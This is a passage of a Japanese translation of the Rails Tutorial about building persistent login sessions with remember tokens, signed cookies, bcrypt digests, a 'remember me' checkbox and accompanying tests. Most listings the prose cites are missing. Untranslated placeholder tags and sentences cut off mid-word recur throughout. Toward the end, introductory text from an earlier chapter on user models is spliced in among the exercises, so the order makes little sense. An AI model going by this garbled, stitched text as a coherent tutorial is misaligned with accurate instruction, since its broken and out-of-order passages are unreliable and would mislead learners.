たとえば以下のように、20年後に期限切れになる記憶トークンと同じ値をcookieに保存することで、永続的なセッションを作ることができます。
上のように20年で期限切れになるcookies設定はよく使われるようになり、今ではRailsにも特殊な\kode{permanent}という専用のメソッドが追加されたほどです。このメソッドを使用すると、コードは以下のようにシンプルになります。
remember_token
cookiesは今から20年後に切れる (\texttt{20.years.from_now})
Rubyは組み込みクラスを含む{0}あらゆる{/0}クラスにメソッドを追加できることを{p1}で学びました。
あのときは、\texttt{palindrome?}メソッドを\texttt{String}クラスに追加しました (ついでに\texttt{"deified"}も回文になっていることを発見しました)。また、Railsが実は\texttt{blank?}メソッドを\texttt{Object}クラスに追加していることも判明しました (これにより、\texttt{"".blank?}、\texttt{" ".blank?}、\texttt{nil.blank?}はいずれも\texttt{true}になります)。
この\texttt{cookies.permanent}メソッドでは、cookiesが20年後に期限切れになる (\texttt{20.years.from_now}) ように指定していますが、これはRailsの\emph{timeヘルパー}を使用した格好の例題になります。timeヘルパーはRailsによって、数値関連の基底クラスである\texttt{Fixnum}クラスに追加されます。
  $ rails console<n>  >> 1.year.from_now<n>  => Sun, 09 Aug 2015 16:48:17 UTC +00:00<n>  >> 10.weeks.ago<n>  => Sat, 31 May 2014 16:48:45 UTC +00:00
Railsは以下のようなヘルパーも追加しています。
  >> 1.kilobyte<n>  => 1024<n>  >> 5.megabytes<n>  => 5242880
上のヘルパーは、ファイルのアップロードに\texttt{5.megabytes}などの制限を与えるのに便利です。
メソッドを組み込みクラスに追加できる柔軟性の高さのおかげで、純粋なRubyを極めて自然に拡張することができます (もちろん注意して使う必要はありますが)。
実際、Railsのエレガントな仕様の多くは、背後にあるRubyの高い拡張性によって実現されているのです。
ユーザーIDをcookiesに保存するには、\kode{session}メソッドで使用したのと同じパターン (リスト\ref{code:log_in_function}) を使用します。具体的には以下のようになります。
しかしこのままではIDが生のテキストとしてcookiesに保存されてしまうので、アプリケーションのcookiesの形式が見え見えになってしまい、攻撃者がユーザーアカウントを奪い取ることを助けてしまう可能性があります。
これを避けるために、\emph{署名付き}cookieを使用します。これは、cookieをブラウザに保存する前に安全に暗号化するためのものです。
ユーザーIDと永続記憶トークンはペアで扱う必要があるので、cookieも永続化しなくてはなりません。そこで、以下のように\kode{signed}メソッドと\kode{permanent}メソッドをチェイン (連鎖) して使用します。
cookiesを設定すると、以後のページのビューで以下のようにしてcookiesからユーザーを取り出せるようになります。
\kode{cookies.signed[:user\_id]}では自動的にユーザーIDのcookiesの暗号が解除され、元に戻ります。
続いてbcryptを使用し、\kode{cookies[:remember\_token]}が\kode{remember\_digest}と一致することを確認します (リスト\ref{code:user_model_remember})。
ところで、署名されたユーザーIDがあれば記憶トークンは不要なのではないかと疑問に思う方もいるかもしれません。しかし記憶トークンがなければ、�暗号化されたIDを奪った攻撃者は、暗号化IDをそのまま使ってお構いなしにログインしてしまうでしょう。
現在の設計では、攻撃者が仮に両方のcookiesを奪い取ることに成功したとしても、本物のユーザーがログアウトするとログインできないようになっています。
パズルもいよいよ最後のピースを残すだけとなりました。渡されたトークンがユーザーの記憶ダイジェストと一致することを確認します。この一致をbcryptで確認するための様々な方法があります。
\href{https://github.com/rails/rails/blob/master/activemodel/lib/active_model/secure_password.rb}{secure_passwordのソースコード}を調べてみると、以下のような比較を行っている箇所があります
\ref{sec:a_hashed_password}で解説したように、「暗号化されていないパスワード (unencrypted password)」という呼び方は正しくありません。ここで言うセキュアなパスワードとは、単に\emph{ハッシュ化した}という意味であり、本格的な暗号化は行われていないからです。
今回の場合、上のコードを参考に下のようなコードをしようしまs
このコードをじっくり調べてみると、実に奇妙なつくりになっています。bcryptで暗号化されたパスワードを、トークンと直接比較しています。ということは、\emph{==}で比較する際にダイジェストを\kode{復号化}しているのでしょうか。
しかし、bcryptのハッシュは復号化できないはずなので、復号化しているはずはありません。
そこで\href{https://github.com/codahale/bcrypt-ruby/blob/master/lib/bcrypt/password.rb}{bcrypt gemのソースコード}を詳しく調べてみると、なんと、比較に使用している\kode{==}演算子が\emph{再定義}されています。実際の比較をコードで表すと、以下のようになっています。
実際の比較では、\kode{==}の代わりに\kode{is\_password?}という論理値メソッドが使用されています。
これで少し見えてきました。今から書くアプリケーションコードでもこれと同じ方法を使用することにしましょう。
以上の説明を元に、ダイジェストトークンの比較をUserモデルの\kode{authenticated?}メソッドの中に置けばよいのではないかと推測できます。このメソッドは、\kode{has_secure_password}で提供されるユーザー認証用の\kode{authenticate}メソッドと似ています (リスト\ref{code:log_in_success})。
この実装結果をリスト\ref{code:authenticated_p}に示します。
ところで、この\kode{authenticated?}メソッド (リスト\ref{code:authenticated_p}) は記憶ダイジェストと強く結びついていますが、実は他の様々な用途にも応用できます。{3}第{2}10{/2}章{/3}ではこのメソッドを一般化してみます。
\kode{authenticated?}を追加する
記憶トークンを参照しているので問題ありません。メソッドの引数と同じ名前を使用することはよくあります。
もうひとつ、\kode{remember\_digest}の属性の使用法にご注目ください。この使用法は\kode{self.remember\_digest}と同じであり、{1}第{2}6{/2}章{/1}の\kode{name}や\kode{email}の使用法とも似ています。remember_digestの属性は、データベースのカラムに対応してActive Recordによって自動的に作成されます (リスト\ref{code:add_remember_digest_to_users_generated})。
これで、ログインユーザーの記憶処理を作る準備が整いました。\kode{remember}ヘルパーメソッドを追加して、\kode{log\_in}と連携させます (リスト\ref{code:log_in_with_remember})。
ログインしてユーザーを保持する
\kode{log\_in}のときと同様に、リスト\ref{code:log_in_with_remember}では実際のSessionsヘルパーの動作は、\kode{remember}メソッド定義の\kode{user.remember}を呼び出すまで遅延され、そこで記憶トークンを生成してトークンのダイジェストをデータベースに保存します。
続いて上と同様に、\kode{cookies}メソッドでユーザーIDと記憶トークンの永続cookiesを作成します。
作成したコードをリスト\ref{code:remember_method}に示します
ユーザーを記憶する
リスト\ref{code:remember_method}のコードでは、ログインするユーザーはブラウザで有効な記憶トークンを得られるように記憶されますが、リスト{p2}で定義した{3}current_user{/3}メソッドでは一時セッションしか扱っていないので、このままでは正常にどうさしまs
永続セッションの場合は、\kode{session[:user\_id]}が存在すれば一時セッションからユーザーを取り出し、それ以外の場合は\kode{cookies[:user\_id]}からユーザーを取り出すして、対応する永続セッションにログインする必要があります。
これを行うには、以下のように記述します。
これはリスト\ref{code:find_authenticate_user}で使用されていました。
上のコードは動作しますが、今のままでは\kode{session}も\kode{cookies}もそれぞれ2回使用されてしまい、無駄です。
これを解消するには、次のようにします。
上のコードでは、よく使われる以下のような構造が使用されていますが、少し紛らわしい点があります。
一見、上のコードは比較を行っているように見えますが、これは比較では\emph{ありません}。比較であれば\kode{==}を使用するはずですが、ここでは\emph{代入}を行っています。
上を以下のように変更しました。
筆者はこのような場合、代入式全体をかっこで囲むようにしています。これが比較でないことを思い出せるようにするためです。
前述のように\kode{current\_user}ヘルパーを定義すると、リスト\ref{code:persistent_current_user}のようになります。
永続的セッションの\kode{current\_user}を更新する 
# 記憶トークンcookieに対応するユーザーを返す
リスト\ref{code:persistent_current_user}のコードでは、新しくログインしたユーザーは正しく記憶されます。実際にログインしてからブラウザを閉じ、アプリケーションを再起動してからもう一度ブラウザでアプリケーションを開いてみると、期待どおり動作していることを確認できます。
その気になれば、ブラウザのcookiesをブラウザで直接調べて結果を確認することもできます (図\ref{fig:cookie_in_browser})
システムでのcookiesの調べ方については、「<ブラウザ名> inspect cookies」でググってください。
ブラウザに記憶トークンのcookiesを表示する
アプリケーションに現在残された問題はあと1つだけです。ブラウザのcookiesを削除する手段が未実装なので (20年待てば消えますが)、ユーザーがログアウトできません。
ユーザーがログアウトできるようにするために、ユーザーを記憶するためのメソッドと同様の方法で、ユーザーを忘れるためのメソッドを定義します。
この\kode{user.forget}メソッドによって、\kode{user.remember}が取り消されます。具体的には、記憶ダイジェストを\kode{nil}で更新します (リスト\ref{code:user_model_forget})。
\kode{forget}メソッドをUserモデルに追加する
リスト\ref{code:user_model_forget}のコードを使用すると、永続セッションを終了できるようになる準備が整います。終了するには、\kode{forget}ヘルパーメソッドを追加して\kode{log\_out}ヘルパーメソッドから呼び出します (リスト\ref{code:log_out_with_forget})。
永続セッションからログアウトする
# 永続的セッションを破棄する
実は小さなバグが2つ残っています。2つのバグは互いに強く関連しています。
1つ目の地味な問題です。ユーザーは場合によっては、同じサイトを複数のウィンドウ (あるいはタブ) で開いていることもあります。ログアウト用リンクはログイン中には表示されませんが、
読者のPaulo Célio Júniorからのご指摘でした。ありがとうございました。
読者のNiels de Ronからのご指摘でした。ありがとうございます。
FirefoxとChromeを使った具体例で考えてみましょう。ユーザーがFirefoxからログアウトすると、\kode{user.forget}メソッドによって記憶ダイジェストが\kode{nil}になります (リスト\ref{code:user_model_forget})。
この時点では、アプリケーションはFirefoxでまだ正常に動作するはずです。つまり、リスト{p0}では{2}log_out{/2}メソッドによってユーザーIDが削除されるため、ハイライトされている2つの条件が{2}false{/2}になります。
結果として、\kode{current\_user}メソッドの最終的な評価結果は、期待どおり\kode{nil}になります。
結果として、次の\kode{if}文の条件式が評価されます。
このときに\kode{user}が\kode{nil}であれば、1番目の条件式で評価は終了するのですが、実際にはnilではないので、\emph{2番目の}条件式まで評価が進み、そのときにエラーが発生します。
これは、Firefoxでログアウトしたときに (リスト\ref{code:user_model_forget}) ユーザーの記憶ダイジェストが削除されているので、Chromeでアプリケーションにアクセスしたとき、最終的に次の文を実行するからです。
記憶ダイジェストが\kode{nil}になるので、bcryptライブラリ内部で例外が発生します。
この問題を修正するには、\kode{authenticated?}が\kode{false}を返すようにする必要があります。
テスト駆動開発は、この種の地味なバグ修正にはうってつけです。そこで、2つのエラーをキャッチするテストを書くことにします。
リスト\ref{code:user_logout_test}のとき
selfを省略した結果をリスト\ref{code:test_double_logout}に示します。
selfを省略した結果をリスト\ref{code:destroy_forget}に示します。
ログイン中の場合のみログアウトする 
2番目の問題についてですが、統合テストで2種類のブラウザをシミュレートするのは正直かなり困難です。その代わり、同じ問題をUserモデルで直接テストするだけなら簡単に行えます。
記憶ダイジェストを持たないユーザーを用意し (\kode{setup}メソッドで定義した\kode{@user}インスタンス変数ではtrueになります)、続いて\kode{authenticated?}を呼び出します (Listing \ref{code:test_authenticated_invalid_token})。
この中で、記憶トークンを空欄のままにしていることにご注目ください。記憶トークンが使用される前にエラーが発生するので、記憶トークンの値は何でも構わないのです。
A test of \kode{authenticated?} 
エラーを修正してテストが \passing になるようにするには、記憶ダイジェストが\kode{nil}の場合に\kode{false}を返すようにすればよいのです (リスト\ref{code:authenticated_p_fixed})。
Updating \kode{authenticated?} 
ここでは、記憶ダイジェストが\kode{nil}の場合には\kode{return}キーワードで即座にメソッドを終了しています。処理を中途で終了する場合によく使われるテクニックです。
以下のコードでもよいのですが、
筆者はリスト\ref{code:authenticated_p_fixed}のように明示的にreturnする方が、コードが若干短くなることもあって好みです。
リスト\ref{code:authenticated_p_fixed}のコードを使用すると、テストスイート全体が \passing になり、サブタイトルは両方とも修正されるはずです。
\ref{sec:forgetting_users}のコードで、アプリケーションにプロ仕様の完全な認証システムが導入されました。
本章の最後に、[remember me] チェックボックスでログインを保持する方法を解説します。
チェックボックスを追加したモックアップを図\ref{fig:login_remember_me_mockup}に示します。
[remember me] チェックボックスのモックアップ
今回の実装は、リスト\ref{code:login_form}のログインフォームにチェックボックスを追加するところから始めます。
チェックボックスは、他のラベル、テキストフィールド、パスワードフィールド、送信ボタンと同様にヘルパーメソッドで作成できます。
ただし、チェックボックスが正常に動作するためには、以下のようにラベルの\emph{内側}に配置する必要があります。
上をログインフォームに反映したコードをリスト\ref{code:remember_me_checkbox}に示します。
[remember me] チェックボックスをログインフォームに追加する
リスト\ref{code:remember_me_checkbox}では、2つのCSSクラス\kode{checkbox}と\kode{inline}をインクルードしています。Bootstrapではこれらをチェックボックスとテキスト「Remember me on this computer”」として同じ行に配置します。
スタイルを整えるため、もう少しCSSルールを追加します (リスト\ref{code:remember_me_css})。
表示されるログインフォームを図\ref{fig:login_form_remember_me}に示します。
[remember me] チェックボックスのCSS
{0}図8.12{/0} {1}"remember_token" チェックボックスを追加したloginフォーム{/1}
ログインフォームの編集が終わったので、チェックボックスがオンのときにユーザーを記憶し、オフのときには記憶しないようにします。
信じられないかもしれませんが、必要な準備はすべて終わっているので、実装はわずか1行で終わります。
ログインフォームから送信された\kode{params}ハッシュには既にチェックボックスの値が含まれています。リスト\ref{code:remember_me_checkbox}のフォームに無効な値を入力して実際に送信すれば、ページのデバッグ情報で値を確認することもできます。
特に、以下の値は、
チェックボックスがオンのときに\kode{’1’}になり、オフのときに\kode{’0’}になります。
\kode{params}ハッシュのこの値を調べれば、送信された値に基いてユーザーを記憶したり忘れたりできるようになります
ユーザーがこのチェックボックスをオフすると、すべてのコンピュータ上のすべてのブラウザからログアウトしますので、注意が必要です。
ブラウザごとにユーザーのログインセッションを記憶する設計に変更すれば、ユーザーにとってもう少し便利にはなりますが、その分セキュリティが低下するうえ、実装も面倒になります。
やる気の余っている方は実装してみてもよいでしょう。
以前は\kode{remember user}をかっこなしで書きましたが、三項演算子ではかっこを省略すると文法エラーになります。
Sessionsコントローラの\kode{create}に上の行を追加した結果をリスト\ref{code:remember_me_ternary}に示します。驚くほどコンパクトなコードになりました。
既に読者の皆様は、{0}cost{/0}変数の定義に三項演算子を使用したリスト{p1}のコードも理解できるようになったことでしょう。
[remember me] チェックボックスの送信結果を処理する
リスト\ref{code:remember_me_ternary}の実装によって、ログインシステムの実装がついに完了しました。ブラウザでこのチェックボックスを実際にオンにしたりオフにしたりして、動作を確認してみましょう。
10種類の人々
「この世には10種類の人間がいる。三項演算子を理解できる奴と、三項演算子を理解できない奴だ。」は、この業界に古くから伝わるジョークです。なお、「10種類」は2進法なので10進法で書けば「2種類」になります。
上のジョークに倣えば、この世には10種類の人々がいます。三項演算子を好きな人、嫌いな人、三項演算子を知らない人です。
もし3番目に該当したとしても、すぐそのカテゴリの人ではなくなりますのでご心配なく。
プログラミング経験を重ねるうちに、以下のように論理値に応じて分岐する制御フローが実によく出現することがすぐにわかると思います。
  if boolean?
    何かをする
  else
    別のことをする
Rubyや他の言語 (C/C++、Perl、PHP、Javaなど) では、上のようなフローをよりコンパクトな\emph{三項演算子 (ternary operator)} と呼ばれる表現で置き換えることができます (3つの部分から構成されるためそのように呼ばれます)。
  論理値? ?
何かをする : 別のことをする
以下のような代入文を三項演算子で置き換えることもできます。
    var = foo
    var = bar
  var = boolean? ?
foo : bar
最後に、三項演算子を関数の戻り値として使用することもよくあります。
  def foo<n>    do_stuff<n>    boolean? ?
"bar" : "baz"
Rubyでは暗黙的に関数の最後の式の値を返すので、上の\texttt{foo}メソッドは、\texttt{boolean?}が\texttt{true}であるか\texttt{false}であるかに応じて、\texttt{"bar"}または\texttt{"baz"}をそれぞれ返します。
[remember me] 機能は既に快調に動作していますが、ここで終わらせずにテストをちゃんと書き、動作をテストで確認できるようにしておくことが重要です。
テストを書く理由のひとつは、今行った実装のエラーをキャッチできるようにすることです。
しかしもっと重要な理由は、ユーザーを永続化するコードの中心部分が、実はまだまったくテストされていないからです。
これらの課題を達成するには、もう少し新しいテストのテクニックを覚える必要がありますが、それによりテストスイートが一段と強力になります。
[remember me] ボックスをテストする
恥を忍んで申し上げると、筆者が自分自身でリスト\ref{code:remember_me_ternary}でチェックボックスの処理を実装したときは、
最初は上のコードではなく、以下のコードを使用していました。
この流れでは、\kode{params[:session][:remember\_me]}の値は\kode{’0’}または\kode{’1’}のいずれかになりますが、そこに罠がありました。0も1もRubyの論理値では\kode{true}であることを思い出してください。従って、値は\emph{常にtrue}になってしまい、チェックボックスは常にオンになっているのと同じ動作になってしまいました。
この種のミスはまさに、テストでキャッチすべきエラーです。
ユーザーが記憶されるにはログインが必要です。そこで、テスト内でユーザーがログインできるようにするためのヘルパーメソッドを定義することから始めます。
リスト\ref{code:user_login_test_valid_information}では、\kode{post}メソッドと有効な\kode{session}ハッシュを使用してログインしましたが、毎回このようなことをするのは面倒です。
そこで、\kode{log\_in\_as}というヘルパーメソッドを作成してテスト用にログインできるようにし、無駄な繰り返しを排除します。
ログインに使用するメソッドは、テストの種類によって異なります。統合テストの内部では、リスト\ref{code:user_login_test_valid_information}のようにセッションパスをpostしますが、コントローラやモデルなどの単体テストでは同じ方法が使えません (セッションがないからです)。後者の場合は\kode{session}メソッドを人為的に操作して回避しなければなりません。
このため、\kode{log_in_as}ではテストの種類を検出して、それに応じたログインを行えるようにする必要があります。
統合テストとその他のテストを区別するには、Rubyの定番である\kode{defined?}メソッドを使用します。このメソッドは、引数の内容が定義されている場合はtrueを、その他の場合はfalseを返します。
この場合は、\kode{post_via_redirect}メソッド (リスト\ref{code:a_test_for_valid_submission}) が統合テストの場合にのみアクセス可能であることを利用し、以下のようなコードを使用します。
上のコードは、統合テストの実行中には\kode{true}を返し、その他の場合にはfalseを返します。
せっかくなので、統合テストを実行中かどうかを論理値で返す\kode{integration_test?}メソッドを定義し、以下のようにif-thenステートメントをわかりやすく書くことにしましょう。
コメント部分にコードを書けば、\kode{log_in_as}ヘルパーメソッドができあがります (リスト\ref{code:test_helper_log_in})。
注: このコメント部分に書くコードはそれなりに込み入っています。可能であれば、一行ずつ読んで完全に理解しておくことをおすすめします。(訳注: テストのコードでは、操作を実現するためにこのようなトリッキーなコードを使わざるを得ないときがあります。)
\kode{log\_in\_as}ヘルパーを追加する
テストコードを最大限に柔軟にするため、\kode{log_in_as}メソッド (リスト\ref{code:test_helper_log_in}) では\kode{options}ハッシュ (リスト\ref{code:gravatar_option}) を引数に取り、パスワードと [remember me] チェックボックスのデフォルト値をそれぞれ\kode{’password’}と\kode{’1’}に設定します。
特に、キーが存在しない場合はハッシュが\kode{nil}を返すので、
[remember me] チェックボックスの動作を確認するために、2つのテストを作成します。チェックボックスがオンになっている場合とオフになっている場合のテストです。
リスト\ref{code:test_helper_log_in}でログインヘルパーメソッドを定義しておいたので、このテストは簡単に書くことができます。2つのテストはそれぞれ以下のようになります。
上のコードの\kode{’1’}は\kode{remember\_me}のデフォルト値なので、1つ目のテストでは省略してもよいのですが、2つのコードを見比べやすいようにあえて省略しませんでした。
ログインに成功すれば、\kode{cookies}内部の\kode{remember\_token}キーを調べることで、ユーザーが保存されたかどうかをチェックできるようになります。
cookiesの値がユーザーの記憶トークンと一致することを確認できれば理想的なのですが、現在の設計ではテストでこの確認を行うことはできません。コントローラ内の\kode{user}変数には記憶トークンの属性が含まれていますが、\kode{remember\_token}は実在しない「仮想」のものなので、\kode{@user}インスタンス変数の方には含まれていません。
この課題は大して難しくないので、\ref{sec:log_in_out_exercises}の演習に回すことにします。さしあたって、今は関連するcookiesが\kode{nil}であるかどうかだけをチェックすればよいことにします。
実はもうひとつ地味な問題があります。ある理由によって、テスト内では\kode{cookies}メソッドにシンボルを使用できないのです。そのため、
上のコードは常に\kode{nil}になってしまいます。
ありがたいことに、文字列キーなら\kode{cookies}で\emph{使用できる}ので、
上のように書けば期待どおりに値が返されます。
以上の結果を反映したテストコードをリスト\ref{code:remember_me_test}に示します
(リスト\ref{code:user_login_test_valid_information}で\kode{users(:michael)}と書くと、リスト\ref{code:real_user_fixture}のフィクスチャユーザーを参照していたことを思い出しましょう)。
[remember me] チェックボックスのテスト 
皆さんが著者と同じ間違いをしていなければ、このテストは \passing になるはずです。
記憶ブランチをテストする
\ref{sec:login_with_remembering}では、それまでの節で実装した永続的セッションが動作するかどうかを手動で確認していました。しかし実は、\kode{current\_user}内のある分岐部分については、これまでまったくテストが行われていないのです。
筆者はこのことに気付いた場合に、テストを忘れている疑いのあるコードブロック内にわざと例外発生を仕込むという手法を好んで使います。そのコードブロックがテストから漏れていれば、テストはパスしてしまうはずです。コードブロックがテストから漏れていなければ、例外が発生してテストが中断するはずです。現在のコードでこれを行ってみた結果をリスト\ref{code:branch_raise}に示します。
テストされていないブランチで例外を発生する
この段階でテストを実行してみると、 \passing になります。
リスト\ref{code:branch_raise}のコードが正常でないことがわかった以上、これはもちろん問題です。
さらに申し上げると、この種の永続的セッションを手動で確認するのは非常に面倒なので、\kode{current_user}をリファクタリングするのであれば ({1}第{2}10{/2}章{/1}で行う予定です) 同時にテストも作成しておくことが重要です。
テスト手順はしんぷるです。
フィクスチャで\kode{user}変数を定義する
渡されたユーザーを\kode{remember}メソッドで記憶する
\kode{current\_user}が、渡されたユーザーと同じであることを確認します。
上の手順では\kode{remember}メソッドでは\kode{session[:user\_id]}が設定されないので、問題の「記憶」ブランチをこれでテストできるようになります。
作成したコードをリスト\ref{code:persistent_sessions_test}に示します
永続的セッションのテスト
テストをもうひとつ追加していることにご注目ください。この追加テストでは、ユーザーの記憶ダイジェストが記憶トークンと正しく対応していない場合に現在のユーザーが\kode{nil}になるかどうかをチェックしています。これによって、以下のネストした\kode{if}ステートメン内の\kode{authenticated?}の式をテストします。
ところで、リスト\ref{code:persistent_sessions_test}では以下のように書いてもよいように思えるかもしれません。
実際、上のように書いても動作します。しかし、\ref{sec:layout_exercises}で簡単に触れたように、アサーション\kode{assert_equal}の引数は、\emph{期待する値}、\emph{実際の値}の順序で書くのがルールになっています。
上の原則に従って、リスト\ref{code:persistent_sessions_test}のコードは以下のように書かれています。
$ bundle exec rake test TEST=test/helpers/sessions_helper_test.rb
ここまでできれば、{0}current_user{/0}メソッドに仕込んだ{0}raise{/0}を削除して元に戻す (リスト{p1}) ことで、リスト\ref{code:branch_no_raise}のテストがパスするはずです
(リスト{p0}から{2}authenticated?{/2}の式を削除するとリスト\ref{code:persistent_sessions_test}の2番目のテストが失敗することも確認できます。つまりこのテストが正しいものであるということです)。
例外発生部分を削除する 
\kode{current\_user}の「記憶」ブランチをテストできたので、今後は手動でひとつひとつ確認しなくても、自信を持って回帰バグをキャッチできます。
この章とひとつ前の章では、実に多くの作業をこなしました。かつては未熟そのものだったアプリケーションを、約束通り、ユーザー登録機能やログイン機能を完全に備えた立派なアプリケーションへと変身させることができたのです。
認証機能の完成に必要なのは、一口に言えばログインステータスとユーザーIDに基いてページへのアクセスを制限することだけです。
次は、ユーザーが自分のプロフィール情報を編集できるようにする予定です。これは{0}第{1}9{/1}章{/0}の最終目標でもあります。
次の章に進む前に、変更をmasterブランチにマージしておきましょう。
$ bundle exec rake test<n>$ git add -A<n>$ git commit -m "Finish log in/log out"<n>$ git checkout master<n>$ git merge log-in-log-out
続いて、リモートリポジトリとproductionサーバーにもプッシュします。
プッシュした後、マイグレーションが完了するまでの間、一時的にステータスが無効 (invalid) になりますので、ご注意ください。
トラフィックの多い本番サイトでは、変更を行う前に以下のように\href{https://devcenter.heroku.com/articles/maintenance-mode}{\emph{メンテナンスモード}}をオンにしておくとよいでしょう。
$ heroku maintenance:on<n>$ git push heroku<n>$ heroku run rake db:migrate<n>$ heroku maintenance:off
上の操作でデプロイとマイグレーションを行うと、その間に標準のエラーページが出力されます
(この作業で煩わされることは今後ありませんが、一度はこのエラーページを目にしておくのもよいでしょう)。
詳しくは、Herokuの\href{https://devcenter.heroku.com/articles/error-pages}{エラーに関するページ} (英語) にあるドキュメントを参照してください。
Railsでは、あるページから別のページに移動するときに状態を保持することができます。ページの状態の保存には、一時cookiesと永続cookiesのどちらも使用できます。
ログインフォームは、ユーザーがログインするための新しいセッションを作成するように設計されています。
\kode{flash.now}メソッドを使用すると、レンダリング済みのページにもフラッシュメッセージを表示できます。
テスト駆動開発は、テストでバグを再現してからデバッグしたい場合に便利です。
\kode{session}メソッドを使用すると、ユーザーIDを安全にブラウザに保存して一時セッションを作成できます。
ログインの状態に応じて、レイアウト上のリンクなどの機能を変更できます。
統合テストでは、ルーティング、データベースの更新、レイアウトの変更が正しく行われているかどうかを確認できます。
記憶トークンやそれと対応する記憶ダイジェストをユーザーごとに関連付けて、永続的セッションで使用できます。
\kode{cookies}メソッドを使用すると、永続的な記憶トークンのcookiesをブラウザに保存して、永続的セッションを作成できます。
ログイン状態 (ログインしているかどうか) は、一時セッションのユーザーIDか、永続的セッションの一意な記憶トークンに基いた現在のユーザーが存在しているかどうかで決定されます。
セッションのユーザーIDを削除し、ブラウザの永続的cookiesを削除すると、アプリケーションからユーザーがログアウトします。
三項演算子を使用すると、単純なif-thenステートメントをコンパクトに記述することができます。
リスト\ref{code:user_model_remember}では、明示的に\kode{User}をプレフィックスとして、新しいトークンやダイジェストのクラスメソッドを定義しました。
これらは問題なく動作します。これらは、実際に\emph{User.new_token}や\emph{User.digest}を使用して\kode{呼び出される}ので、おそらく最も明確な定義方法であると言えるでしょう。
しかし実は、より「Ruby的に正しい」クラスメソッドの定義方法が、おそらく2とおりあります。1つはややわかりにくく、もう1つは非常に混乱するでしょう。
テストスイートを実行して、リスト\ref{code:token_digest_self} (ややわかりにくい) や リスト\ref{code:token_digest_class_self} (非常に混乱する) の実装が正しいことを確認してください。これが問題です
({0}self{/0}は、通常の文脈ではUser「モデル」、つまりユーザーオブジェクトの{1}インスタンス{/1}を指しますが、リスト\ref{code:token_digest_class_self}やリスト{p4}の文脈では、{0}self{/0}は{0}User{/0}「クラス」を指すことにご注意ください。
わかりにくさの原因の一部はこの点にあります)。
\ref{sec:remember_tests}では、現在のアプリケーション設計では、リスト{p2}の統合テストで仮想の{3}remember_token{/3}属性にアクセスする手段がないことを説明しました。
実は、\kode{assigns}という特殊なテストメソッドを使用するとアクセスできるようになります。
第\ref{cha:filling_in_the_layout},章では、新しいユーザーを作成するためのスタブページを作ったところで終わりました (\ref{sec:user_signup})。
コントローラで定義した\emph{インスタンス}変数にテストの内部からアクセスするには、テスト内部で\kode{assigns}メソッドを使用します。このメソッドにはインスタンス変数に対応するシンボルを渡します。
これから5つの章を通して、ユーザー登録ページを作っていくことにしましょう。
たとえば、\kode{create}アクションで\kode{@user}というインスタンス変数が定義されていれば、テスト内部では\kode{assigns(:user)}と書くことでインスタンス変数にアクセスできます。
本章では、一番重要なステップであるユーザー用の\emph{データモデル}の作成と、データを保存する手段の確保について学んでいきます。
本チュートリアルのアプリケーションの場合、Sessionsコントローラの\kode{create}アクションでは、\kode{user}を (インスタンス変数ではない) 通常のローカル変数として定義しましたが、これをインスタンス変数に変えてしまえば、\kode{cookies}にユーザーの記憶トークンが正しく含まれているかどうかをテストできるようになります。
第\ref{cha:sign_up}章では、ユーザーがサイトにユーザー登録できるようにし、ユーザープロファイルのためのページを作成します。
このアイディアに従ってリスト\ref{code:login_create_user_instance}とリスト\ref{code:improved_remember_me_test}の不足分を埋め (ヒントとして\kode{●}や\kode{FILL_IN}を目印に置いてあります)、[remember me] チェックボックスのテストを改良してください。
ユーザー登録できるようになったら、ログインやログアウトをできる仕組みを作り (第\ref{cha:log_in_log_out}章)、第\ref{cha:updating_showing_and_deleting_users}章からは不正なアクセスを取り扱う方法について学んでいきます (\ref{sec:requiring_logged_in_users}) 。
\kode{self}を使ってトークンやダイジェストの新しいメソッドを定義する
最後に、第\ref{cha:account_activation_and_password_reset}章でメールアドレスを使ってアカウントを有効化する方法と、パスワードをリセットする方法について学びます。
まとめると、第\ref{cha:modeling_users}章から第\ref{cha:account_activation_and_password_reset}章を通して、Railsのログインと認証システムをひととおり開発します。
認証
自分で認証システムを作ってみる
事実上、すべてのWebアプリケーションは何らかのログイン/認証システムを必要とします。
そのため、多くのWebフレームワークではこのようなログイン/認証システムを実装するための選択肢が多数提供されています。Railsもまた例外ではありません。
認証 (authentication) と認可 (authorization) のシステムの例だと、\href{http://github.com/thoughtbot/clearance}{Clearance}、\href{http://github.com/binarylogic/authlogic}{Authlogic}、\href{http://github.com/plataformatec/devise}{Devise}、\href{http://railscasts.com/episodes/192-authorization-with-cancan}{CanCan}などがあります (Railsに限らなければ\href{http://en.wikipedia.org/wiki/OpenID}{OpenID}や\href{http://en.wikipedia.org/wiki/Oauth}{OAuth}の上に構築する方法もあります)。
なぜ車輪の再発明をするのか、という質問があるのも当然です。
自分でわざわざ作らなくても、いつも使える方法をただ利用するだけではいけないのでしょうか。
\kode{create}アクション内のインスタンス変数を使用するためのテンプレート
ある実践的な実験によると、多くのサイトの認証システムは膨大なカスタマイズを必要とするため、サードパーティ製品を変更して導入する場合にはシステムをゼロから作成するよりも多くの仕事を要するという結果が出ています。
加えて、既成品のシステムは内部がわかりづらいことが多く、ブラックボックスになっています。自分で作成したシステムであれば、それをとてもよく理解しているはずです。
さらに言えば、最近のRailsへの変更 (\ref{sec:adding_a_secure_password}) により、カスタム認証システムを容易に作成できるようになりました。
最後に、\emph{あえて}最終的にサードパーティの認証システムを導入することになったとしても、自分自身で認証システムを構築した経験があれば、サードパーティ製品を理解して変更することがずっと容易になるはずです。
<n>\end{aside}<n><n>  \section{Userモデル} % (fold)<n>  \label{sec:user_model}<n><n>
ここから3つの章にわたる最終目標はユーザー登録ページ (図\ref{fig:signup_mockup_preview}のモックアップ) を作成することですが、今のままでは新しいユーザーの情報を受け取っても保存する場所がないので、いきなりページを作成するわけにはいきません。
ユーザー登録でまず初めにやることは、それらの情報を保存するためのデータ構造を作成することです。
[remember me] テストを改良するためのテンプレート 
ユーザー登録ページのモックアップ
Railsでは、データモデルで使用するデフォルトのデータ構造のことを\emph{モデル}と呼びます (\ref{sec:mvc}{/1で言うMVCのMのことです)。
この名前の由来は “\href{http://en.wikipedia.org/wiki/Active_record_pattern}{active record pattern}” です。Martin Fowler著「\emph{エンタープライズ アプリケーションアーキテクチャパターン }」で特定および命名されました。
「エスキューエル」と発音しますが、「スィークゥエル」もよく使われます。
さらに、Railsには\emph{マイグレーション}という機能があります。データの定義をRubyで記述することができ、SQLのDDL (Data Definition Language)を新たに学ぶ必要がありません。
Railsは、データストアの詳細からほぼ完全に私たちを切り離してくれます。
